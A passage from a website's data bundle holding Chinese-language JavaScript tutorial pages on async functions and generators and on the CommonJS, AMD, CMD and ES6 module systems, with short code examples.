函数的用法",charIndex:1177},{level:3,title:"async函数的多种使用方法",slug:"async函数的多种使用方法",normalizedTitle:"async函数的多种使用方法",charIndex:1561},{level:2,title:"async函数使用注意",slug:"async函数使用注意",normalizedTitle:"async函数使用注意",charIndex:2040},{level:2,title:"async函数实现的原理",slug:"async函数实现的原理",normalizedTitle:"async函数实现的原理",charIndex:2707}],headersStr:"什么是async函数 async函数对比generator的优点 async 函数的用法 async函数的多种使用方法 async函数使用注意 async函数实现的原理",content:"# async函数\n\n\n# 什么是async函数\n\n> async函数就是 Generator 函数的语法糖，对比Generator函数和async来看\n\n//Generator函数依次读取两个文件\nvar fs = require('fs');\nvar readFile = function (fileName){\n return new Promise(function (resolve, reject){\n  fs.readFile(fileName, function(error, data){\n   if (error) reject(error);\n   resolve(data);\n  });\n });\n};\nvar gen = function* (){\n var f1 = yield readFile('/etc/fstab');\n var f2 = yield readFile('/etc/shells');\n console.log(f1.toString());\n console.log(f2.toString());\n};\n\n//把它改写成async函数\nvar asyncReadFile = async function (){\n var f1 = await readFile('/etc/fstab');\n var f2 = await readFile('/etc/shells');\n console.log(f1.toString());\n console.log(f2.toString());\n};\n\n\nasync 函数就是将 Generator 函数的星号（*）替换成 async，将 yield 替换成 await，仅此而已。\n\n\n# async函数对比generator的优点\n\n 1. 内置执行器。 Generator 函数的执行必须靠执行器，所以才有了 co 函数库，而 async 函数自带执行器。也就是说，async 函数的执行，与普通函数一模一样，只要一行。\n 2. 更好的语义。 async 和 await，比起星号和 yield，语义更清楚了。async 表示函数里有异步操作，await 表示紧跟在后面的表达式需要等待结果。\n 3. 更广的适用性。 co 函数库约定，yield 命令后面只能是 Thunk 函数或 Promise 对象，而 async 函数的 await 命令后面，可以跟 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时等同于同步操作）。\n 4. 返回值是 Promise。async函数的返回值是 Promise 对象，这比 Generator 函数的返回值是 Iterator 对象方便多了。用then方法指定下一步的操作。\n\n\n# async 函数的用法\n\n> async 函数返回一个 Promise 对象，可以使用 then 方法添加回调函数。当函数执行的时候，一旦遇到 await 就会先返回，等到触发的异步操作完成，再接着执行函数体内后面的语句。\n\nfunction timeout(ms) {\n return new Promise((resolve) => {\n  setTimeout(resolve, ms);\n });\n}\nasync function asyncPrint(value, ms) {\n  await console.log(1111111);\n  await timeout(ms);\n  await console.log(2222222);\n  console.log(value)\n}\nasyncPrint('hello world', 50);\n\n\n\n# async函数的多种使用方法\n\n// 函数声明\nasync function foo() {}\n// 函数表达式\nconst foo = async function () {};\n// 对象的方法\nlet obj = { async foo() {} };\nobj.foo().then(...)\n// Class 的方法\nclass Storage {\n  constructor() {\n    this.cachePromise = caches.open('avatars');\n  }\n  async getAvatar(name) {\n    const cache = await this.cachePromise;\n    return cache.match(`/avatars/${name}.jpg`);\n  }\n}\nconst storage = new Storage();\nstorage.getAvatar('jake').then(…);\n// 箭头函数\nconst foo = async () => {};\n\n\n\n# async函数使用注意\n\n 1. await 命令后面的 Promise 对象，运行结果可能是 rejected，所以最好把 await 命令放在 try...catch 代码块中。\n\nasync function myFunction() {\n try {\n  await somethingThatReturnsAPromise();\n } catch (err) {\n  console.log(err);\n }\n}\n// 另一种写法\nasync function myFunction() {\n await somethingThatReturnsAPromise().catch(function (err){\n  console.log(err);\n });\n}\n\n\n 2. await 命令只能用在 async 函数之中，如果用在普通函数，就会报错。\n 3. 两个相互不依赖的异步操作同时触发\n\nlet foo = await getFoo();\nlet bar = await getBar();\n\n//让getFoo和getBar同时触发\n// 写法一\nlet [foo, bar] = await Promise.all([getFoo(), getBar()]);\n\n// 写法二\nlet fooPromise = getFoo();\nlet barPromise = getBar();\nlet foo = await fooPromise;\nlet bar = await barPromise;\n\n\n\n# async函数实现的原理\n\nasync 函数的实现，就是将 Generator 函数和自动执行器，包装在一个函数里。\n\nasync function fn(args){\n // ...\n}\n// 等同于\nfunction fn(args){\n return spawn(function*() {\n  // ...\n });\n}\n\n\n所有的 async 函数都可以写成上面的第二种形式，其中的 spawn 函数就是自动执行器。\n下面给出 spawn 函数的实现，基本就是前文自动执行器的翻版。\n\nfunction spawn(genF) {\n return new Promise(function(resolve, reject) {\n  var gen = genF();\n  function step(nextF) {\n   try {\n    var next = nextF();\n   } catch(e) {\n    return reject(e);\n   }\n   if(next.done) {\n    return resolve(next.value);\n   }\n   Promise.resolve(next.value).then(function(v) {\n    step(function() { return gen.next(v); });   \n   }, function(e) {\n    step(function() { return gen.throw(e); });\n   });\n  }\n  step(function() { return gen.next(undefined); });\n });\n}\n\n\nasync 函数是非常新的语法功能，新到都不属于 ES6，而是属于 ES7。目前，它仍处于提案阶段，但是转码器 Babel 和 regenerator 都已经支持，转码后就能使用。",normalizedContent:"# async函数\n\n\n# 什么是async函数\n\n> async函数就是 generator 函数的语法糖，对比generator函数和async来看\n\n//generator函数依次读取两个文件\nvar fs = require('fs');\nvar readfile = function (filename){\n return new promise(function (resolve, reject){\n  fs.readfile(filename, function(error, data){\n   if (error) reject(error);\n   resolve(data);\n  });\n });\n};\nvar gen = function* (){\n var f1 = yield readfile('/etc/fstab');\n var f2 = yield readfile('/etc/shells');\n console.log(f1.tostring());\n console.log(f2.tostring());\n};\n\n//把它改写成async函数\nvar asyncreadfile = async function (){\n var f1 = await readfile('/etc/fstab');\n var f2 = await readfile('/etc/shells');\n console.log(f1.tostring());\n console.log(f2.tostring());\n};\n\n\nasync 函数就是将 generator 函数的星号（*）替换成 async，将 yield 替换成 await，仅此而已。\n\n\n# async函数对比generator的优点\n\n 1. 内置执行器。 generator 函数的执行必须靠执行器，所以才有了 co 函数库，而 async 函数自带执行器。也就是说，async 函数的执行，与普通函数一模一样，只要一行。\n 2. 更好的语义。 async 和 await，比起星号和 yield，语义更清楚了。async 表示函数里有异步操作，await 表示紧跟在后面的表达式需要等待结果。\n 3. 更广的适用性。 co 函数库约定，yield 命令后面只能是 thunk 函数或 promise 对象，而 async 函数的 await 命令后面，可以跟 promise 对象和原始类型的值（数值、字符串和布尔值，但这时等同于同步操作）。\n 4. 返回值是 promise。async函数的返回值是 promise 对象，这比 generator 函数的返回值是 iterator 对象方便多了。用then方法指定下一步的操作。\n\n\n# async 函数的用法\n\n> async 函数返回一个 promise 对象，可以使用 then 方法添加回调函数。当函数执行的时候，一旦遇到 await 就会先返回，等到触发的异步操作完成，再接着执行函数体内后面的语句。\n\nfunction timeout(ms) {\n return new promise((resolve) => {\n  settimeout(resolve, ms);\n });\n}\nasync function asyncprint(value, ms) {\n  await console.log(1111111);\n  await timeout(ms);\n  await console.log(2222222);\n  console.log(value)\n}\nasyncprint('hello world', 50);\n\n\n\n# async函数的多种使用方法\n\n// 函数声明\nasync function foo() {}\n// 函数表达式\nconst foo = async function () {};\n// 对象的方法\nlet obj = { async foo() {} };\nobj.foo().then(...)\n// class 的方法\nclass storage {\n  constructor() {\n    this.cachepromise = caches.open('avatars');\n  }\n  async getavatar(name) {\n    const cache = await this.cachepromise;\n    return cache.match(`/avatars/${name}.jpg`);\n  }\n}\nconst storage = new storage();\nstorage.getavatar('jake').then(…);\n// 箭头函数\nconst foo = async () => {};\n\n\n\n# async函数使用注意\n\n 1. await 命令后面的 promise 对象，运行结果可能是 rejected，所以最好把 await 命令放在 try...catch 代码块中。\n\nasync function myfunction() {\n try {\n  await somethingthatreturnsapromise();\n } catch (err) {\n  console.log(err);\n }\n}\n// 另一种写法\nasync function myfunction() {\n await somethingthatreturnsapromise().catch(function (err){\n  console.log(err);\n });\n}\n\n\n 2. await 命令只能用在 async 函数之中，如果用在普通函数，就会报错。\n 3. 两个相互不依赖的异步操作同时触发\n\nlet foo = await getfoo();\nlet bar = await getbar();\n\n//让getfoo和getbar同时触发\n// 写法一\nlet [foo, bar] = await promise.all([getfoo(), getbar()]);\n\n// 写法二\nlet foopromise = getfoo();\nlet barpromise = getbar();\nlet foo = await foopromise;\nlet bar = await barpromise;\n\n\n\n# async函数实现的原理\n\nasync 函数的实现，就是将 generator 函数和自动执行器，包装在一个函数里。\n\nasync function fn(args){\n // ...\n}\n// 等同于\nfunction fn(args){\n return spawn(function*() {\n  // ...\n });\n}\n\n\n所有的 async 函数都可以写成上面的第二种形式，其中的 spawn 函数就是自动执行器。\n下面给出 spawn 函数的实现，基本就是前文自动执行器的翻版。\n\nfunction spawn(genf) {\n return new promise(function(resolve, reject) {\n  var gen = genf();\n  function step(nextf) {\n   try {\n    var next = nextf();\n   } catch(e) {\n    return reject(e);\n   }\n   if(next.done) {\n    return resolve(next.value);\n   }\n   promise.resolve(next.value).then(function(v) {\n    step(function() { return gen.next(v); });   \n   }, function(e) {\n    step(function() { return gen.throw(e); });\n   });\n  }\n  step(function() { return gen.next(undefined); });\n });\n}\n\n\nasync 函数是非常新的语法功能，新到都不属于 es6，而是属于 es7。目前，它仍处于提案阶段，但是转码器 babel 和 regenerator 都已经支持，转码后就能使用。",charsets:{cjk:!0}},{title:"模块化概述",frontmatter:{},regularPath:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/%E6%A8%A1%E5%9D%97%E5%8C%96.html",relativePath:"Javascript/Javascript扩展操作/模块化.md",key:"v-278ee170",path:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/%E6%A8%A1%E5%9D%97%E5%8C%96.html",headers:[{level:2,title:"模块化概述",slug:"模块化概述",normalizedTitle:"模块化概述",charIndex:2},{level:2,title:"AMD",slug:"amd",normalizedTitle:"amd",charIndex:336},{level:3,title:"1. 引入require.js文件",slug:"_1-引入require-js文件",normalizedTitle:"1. 引入require.js文件",charIndex:813},{level:3,title:"2. 模块编写 (define)",slug:"_2-模块编写-define",normalizedTitle:"2. 模块编写 (define)",charIndex:917},{level:3,title:"模块加载的配置",slug:"模块加载的配置",normalizedTitle:"模块加载的配置",charIndex:1687},{level:3,title:"兼容性",slug:"兼容性",normalizedTitle:"兼容性",charIndex:2125},{level:2,title:"CMD",slug:"cmd",normalizedTitle:"cmd",charIndex:341},{level:3,title:"CMD 模块编写",slug:"cmd-模块编写",normalizedTitle:"cmd 模块编写",charIndex:2299},{level:3,title:"AMD 与 CMD 的区别",slug:"amd-与-cmd-的区别",normalizedTitle:"amd 与 cmd 的区别",charIndex:3070},{level:3,title:"兼容性",slug:"兼容性-2",normalizedTitle:"兼容性",charIndex:2125},{level:2,title:"ES6中的模块化",slug:"es6中的模块化",normalizedTitle:"es6中的模块化",charIndex:3481},{level:3,title:"1. export命令",slug:"_1-export命令",normalizedTitle:"1. export命令",charIndex:3712},{level:3,title:"2. export default 命令",slug:"_2-export-default-命令",normalizedTitle:"2. export default 命令",charIndex:4232},{level:3,title:"3. import 命令",slug:"_3-import-命令",normalizedTitle:"3. import 命令",charIndex:4612}],headersStr:"模块化概述 AMD 1. 引入require.js文件 2. 模块编写 (define) 模块加载的配置 兼容性 CMD CMD 模块编写 AMD 与 CMD 的区别 兼容性 ES6中的模块化 1. export命令 2. export default 命令 3. import 命令",content:"# 模块化概述\n\n模块化，即将一个大程序拆分成互相依赖的小文件，再用简单的方法拼装起来。可以更方便地使用别人的代码，想要什么功能，就加载什么模块。 例如CSS的@import\n\nJavaScript原本的模块化可以通过函数或对象实现：\n\n函数： 将几个函数封装到一个文件，需要的时候记载这个文件，调用其中函数即可。 但是这样会污染全局变量，造成命名冲突。\n\n对象： 模块写成一个对象，模块成员都封装在对象里，通过调用对象属性，访问使用模块成员。但同时也暴露了模块成员，外部可以修改模块内部状态。\n\n而JavaScript历史上并没有模块体系，无法将一个大程序拆分，对开发大型的、复杂的项目形成了巨大障碍。所以，社区制定了一些模块加载方案，最主要的有 CommonJS 和 AMD 、CMD。\n\n> 模块化开发的前提就是所有开发者必须以同样的方式编写模块，否则你有你的写法，我有我的写法，就会乱套，所以出现了四种规范 CommonJS，AMD，CMD，ES6模块化。\n\n * CommonJS: 服务器端模块化，如Node.js\n * AMD: 浏览器模块化，RequireJS 在推广过程中对模块定义的规范化的产出\n * CMD: 浏览器模块化，国内发展出来的，CMD有个浏览器的实现SeaJS，SeaJS要解决的问题和requireJS一样，只不过在模块定义方式和模块加载（可以说运行、解析）时机上有所不同\n * ES6 Module: 浏览器模块化，ES6标准的模块化，用以取代 CommonJS 和 AMD 规范。\n\n\n# AMD\n\nAMD规范不是JavaScript原生支持，使用AMD规范进行页面开发需要用到对应的库函数，也就是大名鼎鼎RequireJS。\n\n它采用异步方式加载模块，模块的加载不影响它后面语句的运行。所有依赖这个模块的语句，都定义在一个回调函数中，等到加载完成之后，这个回调函数才会运行。\n\n\n# 1. 引入require.js文件\n\n<script src=\"https://cdn.bootcss.com/require.js/2.3.6/require.min.js\"><\/script>\n\n\n\n# 2. 模块编写 (define)\n\nrequire.js中，每个模块就是一个js文件。RequireJS定义了一个函数 define，它是全局变量，用来定义模块:\n\ndefine(id?, dependencies?, factory);\n\n\n参数说明：\n\n参数             值              说明\nid             string         (可选)模块名称\ndependencies   array          (可选)依赖数组,表示该模块所依赖的模块，模块名不需要加js后缀\nfactory        array/object   模块初始化要执行的函数或对象。如果为函数，它应该只被执行一次。如果是对象，此对象应该为模块的输出值\n\n# 导出模块\n\nrequire.js加载的模块，采用AMD规范。也就是说，模块必须按照AMD的规定来写。\n\n假定现在顶一个模块math.js，如果不需要依赖其他模块，则:\n\ndefine(function(){\n    var num = 10;\n    function add(a, b){ return a + b };\n\n    // 声明了两个属性进行导出\n    return {\n        num,\n        add\n    }\n})\n\n\n# 导入模块\n\n例子：main.js文件加载两个模块(jquery, math)并在回调函数中使用：\n\n// main.js 文件\nrequire(['jquery', 'math'], function ($, math){\n    // 回调函数中的math即为刚才导出的{ num, add }\n　　alert( math.add(1,2) )   // 3\n});\n\n\n\n# 模块加载的配置\n\n上面案例中，引入三个模块(jquery, math)，默认情况下，require.js假定这两个模块与main.js在同一个目录，文件名分别为jquery.js和math.js，然后自动加载。\n\n使用require.config()方法，可以对模块的加载行为进行自定义:\n\nrequire.config({\n    baseUrl: \"./js\",\n　　paths: {\n　　　　\"jquery\": \"https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min\",\n　　　　\"math\": \"lib/math.min\",    // 省略js后缀\n　　}\n});\n\n\n配置项       值        说明\nbaseUrl   string   定义读取模块的根目录\npaths     object   定义模块路径与别名，如上例模块路径lib/math.min，用math指代\n\n\n# 兼容性\n\n\n\n\n# CMD\n\nCMD规范是国内发展出来的，CMD的浏览器的实现是sea.js，SeaJS与requireJS类似，只不过在模块定义方式和模块加载（运行、解析）时机上有所不同。\n\n导入：\n\n<script src=\"https://cdn.bootcss.com/seajs/3.0.3/sea.js\"><\/script>\n\n\n\n# CMD 模块编写\n\n在 CMD 规范中，一个模块就是一个文件。代码的书写格式如下:\n\ndefine(function(require, exports, module) {\n\n  // 模块代码\n\n});\n\n\n参数        说明\nrequire   可以用来导入其他模块\nexports   可以把该模块内容属性方法导出\nmodule    一个对象，存储了与当前模块相关联的一些属性和方法\n\nCMD 模块定义规范\n\n# 定义模块 （define）\n\n// math.js文件\ndefine(function(require, exports, module) {\n    require('./jquery.min.js')     // require 导入jquery\n    $.ajax()\n    exports.add = function(a, b){ return a+b };        // export导出函数add\n});\n\n\n# 导入模块 （seajs.use）\n\nseajs.use(['./math.js'], function (math) {\n   math.add(1, 2);    // 3\n});\n\n\n# 配置Sea.js （ seajs.config() ）\n\n配置项     值        说明\nbase    string   定义读取模块的根目录\nalias   object   定义模块路径与别名，如模块路径../lib/jquery.min.js，用jquery指代\n\nseajs.config({\n    base:\"./js\"  \n    alias:{\n        'jquery':'../lib/jquery.min.js'\n    }\n});\n\n\n\n# AMD 与 CMD 的区别\n\n * AMD是依赖关系前置,在定义模块的时候就要声明其依赖的模块;\n * CMD是按需加载依赖就近,只有在用到某个模块的时候再去require：\n\n// CMD\ndefine(function(require, exports, module) {\n  var a = require('./a')\n  a.doSomething()\n  // 此处略去 100 行\n  var b = require('./b') // 依赖可以就近书写\n  b.doSomething()\n  // ...\n})\n\n// AMD 默认推荐的是\ndefine(['./a', './b'], function(a, b) { // 依赖必须一开始就写好\n  a.doSomething()\n  // 此处略去 100 行\n  b.doSomething()\n  ...\n})\n\n\n\n# 兼容性\n\n\n\n\n# ES6中的模块化\n\n> ES6 模块不是对象，而是通过export命令显式指定输出的代码，再通过import命令输入。\n\nES6 的模块自动采用严格模式，不管你有没有在模块头部加上\"use strict\";。\n\n> 注意：ES6模块中，顶层的this指向 undefined，即不应该在顶层代码使用this。\n\n模块功能主要由两个命令构成：export和import。export命令用于规定模块的对外接口，import命令用于输入其他模块提供的功能。\n\n\n# 1. export命令\n\n一个模块就是一个独立的文件。该文件内部的所有变量，外部无法获取。export可以让我们把变量，函数，对象进行模块化，提供外部调用接口，让外部进行引用。\n\nexport var firstName = 'Michael';\nexport var lastName = 'Jackson';\nexport var year = 1958;\n\n\n或在文件末尾多变量输出：\n\nvar firstName = 'Michael';\nvar lastName = 'Jackson';\nvar year = 1958;\n\nexport {firstName, lastName, year};\n\n\nexport命令除了输出变量，还可以输出函数或类（class）。\n\nexprot function fun(){ }\n\n\n或\n\nfunction fun() {}\n\nexprot {fun};\n\n\n有些时候并不想暴露模块里边的变量名称，还可使用as关键字对变量进行重命名\n\nexport {\n    v1 as firstName,\n    v2 as lastName,\n    v3 as lastName\n};\n\n\n\n# 2. export default 命令\n\n 1. export与export default均可用于导出常量、函数、文件、模块等\n 2. 你可以在其它文件或模块中通过import+(常量 | 函数 | 文件 | 模块)名的方式，将其导入，以便能够对其进行使用\n 3. 在一个文件或模块中，export、import可以有多个，export default仅有一个\n 4. 通过export方式导出，在导入时要加{ }，export default则不需要\n\nvar name=\"李四\";\nexport { name }\n//import { name } from \"./a.js\"\n可以写成：\nvar name=\"李四\";\nexport default name\n//import name from \"./a.js\" 这里name不需要大括号\n\n\n\n# 3. import 命令\n\n使用export命令定义了模块的对外接口以后，其他 JS 文件就可以通过import命令加载这个模块。\n\nexport对应的导入方式\n\nexport var a ='js';\nexport function add(a,b){\n    return a+b;\n}\n\nimport {a,add} from './temp';\n\n//也可以分开写\nimport a from './temp';\nimport add from './temp';\n\n\nexport defalut对应的导入方式\n\nvar a ='js';\nfunction add(a,b){\n    return a+b;\n}\nexport defalut {a, add}\n\nimport obj from './temp';\n\n\n * import用as方式引入 (多个变量用一个空对象来代理,你所有的方法和属性都是在types命名空间)\n\nconst LOGIN = 'login';\nconst LOGOUT = 'logout';\nconst TITLE = 'title'\nexport {LOGIN,LOGOUT,TITLE}\n\n\nimport * as types from './temp.js' //你所有的方法和属性都是在types命名空间\n// 调用里面里面的值可以 这样做\ntypes.LOGIN\ntypes.LOGOUT\ntypes.TITLE\n\n\n由于ES6的模块化在浏览器端兼容性较差，不能直接在浏览器中预览，必须要使用Babel进行编译之后正常看到结果。",normalizedContent:"# 模块化概述\n\n模块化，即将一个大程序拆分成互相依赖的小文件，再用简单的方法拼装起来。可以更方便地使用别人的代码，想要什么功能，就加载什么模块。 例如css的@import\n\njavascript原本的模块化可以通过函数或对象实现：\n\n函数： 将几个函数封装到一个文件，需要的时候记载这个文件，调用其中函数即可。 但是这样会污染全局变量，造成命名冲突。\n\n对象： 模块写成一个对象，模块成员都封装在对象里，通过调用对象属性，访问使用模块成员。但同时也暴露了模块成员，外部可以修改模块内部状态。\n\n而javascript历史上并没有模块体系，无法将一个大程序拆分，对开发大型的、复杂的项目形成了巨大障碍。所以，社区制定了一些模块加载方案，最主要的有 commonjs 和 amd 、cmd。\n\n> 模块化开发的前提就是所有开发者必须以同样的方式编写模块，否则你有你的写法，我有我的写法，就会乱套，所以出现了四种规范 commonjs，amd，cmd，es6模块化。\n\n * commonjs: 服务器端模块化，如node.js\n * amd: 浏览器模块化，requirejs 在推广过程中对模块定义的规范化的产出\n * cmd: 浏览器模块化，国内发展出来的，cmd有个浏览器的实现seajs，seajs要解决的问题和requirejs一样，只不过在模块定义方式和模块加载（可以说运行、解析）时机上有所不同\n * es6 module: 浏览器模块化，es6标准的模块化，用以取代 commonjs 和 amd 规范。\n\n\n# amd\n\namd规范不是javascript原生支持，使用amd规范进行页面开发需要用到对应的库函数，也就是大名鼎鼎requirejs。\n\n它采用异步方式加载模块，模块的加载不影响它后面语句的运行。所有依赖这个模块的语句，都定义在一个回调函数中，等到加载完成之后，这个回调函数才会运行。\n\n\n# 1. 引入require.js文件\n\n<script src=\"https://cdn.bootcss.com/require.js/2.3.6/require.min.js\"><\/script>\n\n\n\n# 2. 模块编写 (define)\n\nrequire.js中，每个模块就是一个js文件。requirejs定义了一个函数 define，它是全局变量，用来定义模块:\n\ndefine(id?, dependencies?, factory);\n\n\n参数说明：\n\n参数             值              说明\nid             string         (可选)模块名称\ndependencies   array          (可选)依赖数组,表示该模块所依赖的模块，模块名不需要加js后缀\nfactory        array/object   模块初始化要执行的函数或对象。如果为函数，它应该只被执行一次。如果是对象，此对象应该为模块的输出值\n\n# 导出模块\n\nrequire.js加载的模块，采用amd规范。也就是说，模块必须按照amd的规定来写。\n\n假定现在顶一个模块math.js，如果不需要依赖其他模块，则:\n\ndefine(function(){\n    var num = 10;\n    function add(a, b){ return a + b };\n\n    // 声明了两个属性进行导出\n    return {\n        num,\n        add\n    }\n})\n\n\n# 导入模块\n\n例子：main.js文件加载两个模块(jquery, math)并在回调函数中使用：\n\n// main.js 文件\nrequire(['jquery', 'math'], function ($, math){\n    // 回调函数中的math即为刚才导出的{ num, add }\n　　alert( math.add(1,2) )   // 3\n});\n\n\n\n# 模块加载的配置\n\n上面案例中，引入三个模块(jquery, math)，默认情况下，require.js假定这两个模块与main.js在同一个目录，文件名分别为jquery.js和math.js，然后自动加载。\n\n使用require.config()方法，可以对模块的加载行为进行自定义:\n\nrequire.config({\n    baseurl: \"./js\",\n　　paths: {\n　　　　\"jquery\": \"https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min\",\n　　　　\"math\": \"lib/math.min\",    // 省略js后缀\n　　}\n});\n\n\n配置项       值        说明\nbaseurl   string   定义读取模块的根目录\npaths     object   定义模块路径与别名，如上例模块路径lib/math.min，用math指代\n\n\n# 兼容性\n\n\n\n\n# cmd\n\ncmd规范是国内发展出来的，cmd的浏览器的实现是sea.js，seajs与requirejs类似，只不过在模块定义方式和模块加载（运行、解析）时机上有所不同。\n\n导入：\n\n<script src=\"https://cdn.bootcss.com/seajs/3.0.3/sea.js\"><\/script>\n\n\n\n# cmd 模块编写\n\n在 cmd 规范中，一个模块就是一个文件。代码的书写格式如下:\n\ndefine(function(require, exports, module) {\n\n  // 模块代码\n\n});\n\n\n参数        说明\nrequire   可以用来导入其他模块\nexports   可以把该模块内容属性方法导出\nmodule    一个对象，存储了与当前模块相关联的一些属性和方法\n\ncmd 模块定义规范\n\n# 定义模块 （define）\n\n// math.js文件\ndefine(function(require, exports, module) {\n    require('./jquery.min.js')     // require 导入jquery\n    $.ajax()\n    exports.add = function(a, b){ return a+b };        // export导出函数add\n});\n\n\n# 导入模块 （seajs.use）\n\nseajs.use(['./math.js'], function (math) {\n   math.add(1, 2);    // 3\n});\n\n\n# 配置sea.js （ seajs.config() ）\n\n配置项     值        说明\nbase    string   定义读取模块的根目录\nalias   object   定义模块路径与别名，如模块路径../lib/jquery.min.js，用jquery指代\n\nseajs.config({\n    base:\"./js\"  \n    alias:{\n        'jquery':'../lib/jquery.min.js'\n    }\n});\n\n\n\n# amd 与 cmd 的区别\n\n * amd是依赖关系前置,在定义模块的时候就要声明其依赖的模块;\n * cmd是按需加载依赖就近,只有在用到某个模块的时候再去require：\n\n// cmd\ndefine(function(require, exports, module) {\n  var a = require('./a')\n  a.dosomething()\n  // 此处略去 100 行\n  var b = require('./b') // 依赖可以就近书写\n  b.dosomething()\n  // ...\n})\n\n// amd 默认推荐的是\ndefine(['./a', './b'], function(a, b) { // 依赖必须一开始就写好\n  a.dosomething()\n  // 此处略去 100 行\n  b.dosomething()\n  ...\n})\n\n\n\n# 兼容性\n\n\n\n\n# es6中的模块化\n\n> es6 模块不是对象，而是通过export命令显式指定输出的代码，再通过import命令输入。\n\nes6 的模块自动采用严格模式，不管你有没有在模块头部加上\"use strict\";。\n\n> 注意：es6模块中，顶层的this指向 undefined，即不应该在顶层代码使用this。\n\n模块功能主要由两个命令构成：export和import。export命令用于规定模块的对外接口，import命令用于输入其他模块提供的功能。\n\n\n# 1. export命令\n\n一个模块就是一个独立的文件。该文件内部的所有变量，外部无法获取。export可以让我们把变量，函数，对象进行模块化，提供外部调用接口，让外部进行引用。\n\nexport var firstname = 'michael';\nexport var lastname = 'jackson';\nexport var year = 1958;\n\n\n或在文件末尾多变量输出：\n\nvar firstname = 'michael';\nvar lastname = 'jackson';\nvar year = 1958;\n\nexport {firstname, lastname, year};\n\n\nexport命令除了输出变量，还可以输出函数或类（class）。\n\nexprot function fun(){ }\n\n\n或\n\nfunction fun() {}\n\nexprot {fun};\n\n\n有些时候并不想暴露模块里边的变量名称，还可使用as关键字对变量进行重命名\n\nexport {\n    v1 as firstname,\n    v2 as lastname,\n    v3 as lastname\n};\n\n\n\n# 2. export default 命令\n\n 1. export与export default均可用于导出常量、函数、文件、模块等\n 2. 你可以在其它文件或模块中通过import+(常量 | 函数 | 文件 | 模块)名的方式，将其导入，以便能够对其进行使用\n 3. 在一个文件或模块中，export、import可以有多个，export default仅有一个\n 4. 通过export方式导出，在导入时要加{ }，export default则不需要\n\nvar name=\"李四\";\nexport { name }\n//import { name } from \"./a.js\"\n可以写成：\nvar name=\"李四\";\nexport default name\n//import name from \"./a.js\" 这里name不需要大括号\n\n\n\n# 3. import 命令\n\n使用export命令定义了模块的对外接口以后，其他 js 文件就可以通过import命令加载这个模块。\n\nexport对应的导入方式\n\nexport var a ='js';\nexport function add(a,b){\n    return a+b;\n}\n\nimport {a,add} from './temp';\n\n//也可以分开写\nimport a from './temp';\nimport add from './temp';\n\n\nexport defalut对应的导入方式\n\nvar a ='js';\nfunction add(a,b){\n    return a+b;\n}\nexport defalut {a, add}\n\nimport obj from './temp';\n\n\n * import用as方式引入 (多个变量用一个空对象来代理,你所有的方法和属性都是在types命名空间)\n\nconst login = 'login';\nconst logout = 'logout';\nconst title = 'title'\nexport {login,logout,title}\n\n\nimport * as types from './temp.js' //你所有的方法和属性都是在types命名空间\n// 调用里面里面的值可以 这样做\ntypes.login\ntypes.logout\ntypes.title\n\n\n由于es6的模块化在浏览器端兼容性较差，不能直接在浏览器中预览，必须要使用babel进行编译之后正常看到结果。",charsets:{cjk:!0}},{title:"类型声明",frontmatter:{},regularPath:"/Javascript/TypeScript%E5%85%A5%E9%97%A8/02-%E5%9F%BA%E7%A1%80.html",relativePath:"Javascript/TypeScript入门/02-基础.md",key:"v-3a0230b7",path:"/Javascript/TypeScript%E5%85%A5%E9%97%A8/02-%E5%9F%BA%E7%A1%80.html",headers:[{level:2,title:"类型声明",slug:"类型声明",normalizedTitle:"类型声明",charIndex:2},{level:2,title:"原始数据类型",slug:"原始数据类型",normalizedTitle:"原始数据类型",charIndex:278},{level:2,title:"任意值",slug:"任意值",normalizedTitle:"任意值",charIndex:2342},{level:2,title:"自动类型判断",slug:"自动类型判断",normalizedTitle:"自动类型判断",charIndex:2908},{level:2,title:"联合类型",slug:"联合类型",normalizedTitle:"联合类型",charIndex:3456},{level:2,title:"对象的类型——接口",slug:"对象的类型-接口",normalizedTitle:"对象的类型——接口",charIndex:3925},{level:3,title:"可选属性",slug:"可选属性",normalizedTitle:"可选属性",charIndex:4941},{level:3,title:"任意属性",slug:"任意属性",normalizedTitle:"任意属性",charIndex:5570},{level:2,title:"数组的类型",slug:"数组的类型",normalizedTitle:"数组的类型",charIndex:7913},{level:3,title:"「类型 + 方括号」表示法§",slug:"「类型-方括号」表示法§",normalizedTitle:"「类型 + 方括号」表示法§",charIndex:7923},{level:3,title:"数组泛型",slug:"数组泛型",normalizedTitle:"数组泛型",charIndex:8368},{level:3,title:"用接口表示数组",slug:"用接口表示数组",normalizedTitle:"用接口表示数组",charIndex:8478},{level:3,title:"类数组",slug:"类数组",normalizedTitle:"类数组",charIndex:8709},{level:3,title:"any 在数组中的应用",slug:"any-在数组中的应用",normalizedTitle:"any 在数组中的应用",charIndex:9462},{level:2,title:"函数的类型",slug:"函数的类型",normalizedTitle:"函数的类型",charIndex:9584},{level:3,title:"函数声明",slug:"函数声明",normalizedTitle:"函数声明",charIndex:9594},{level:3,title:"函数表达式",slug:"函数表达式",normalizedTitle:"函数表达式",charIndex:9657},{level:3,title:"用接口定义函数的形状",slug:"用接口定义函数的形状",normalizedTitle:"用接口定义函数的形状",charIndex:10703},{level:3,title:"可选参数",slug:"可选参数",normalizedTitle:"可选参数",charIndex:11020},{level:3,title:"参数默认值",slug:"参数默认值",normalizedTitle:"参数默认值",charIndex:11725},{level:3,title:"剩余参数",slug:"剩余参数",normalizedTitle:"剩余参数",charIndex:12180},{level:3,title:"重载",slug:"重载",normalizedTitle:"重载",charIndex:12563},{level:2,title:"类型断言",slug:"类型断言",normalizedTitle:"类型断言",charIndex:13389},{level:3,title:"语法",slug:"语法",normalizedTitle:"语法",charIndex:152},{level:3,title:"类型断言的用途",slug:"类型断言的用途",normalizedTitle:"类型断言的用途",charIndex:13827},{level:3,title:"类型断言的限制",slug:"类型断言的限制",normalizedTitle:"类型断言的限制",charIndex:13920},{level:3,title:"双重断言",slug:"双重断言",normalizedTitle:"双重断言",charIndex:15443},{level:3,title:"类型断言 vs 类型转换",slug:"类型断言-vs-类型转换",normalizedTitle:"类型断言 vs 类型转换",charIndex:15875},{level:3,title:"类型断言 vs 类型声明",slug:"类型断言-vs-类型声明",normalizedTitle:"类型断言 vs 类型声明",charIndex:16399},{level:3,title:"类型断言 vs 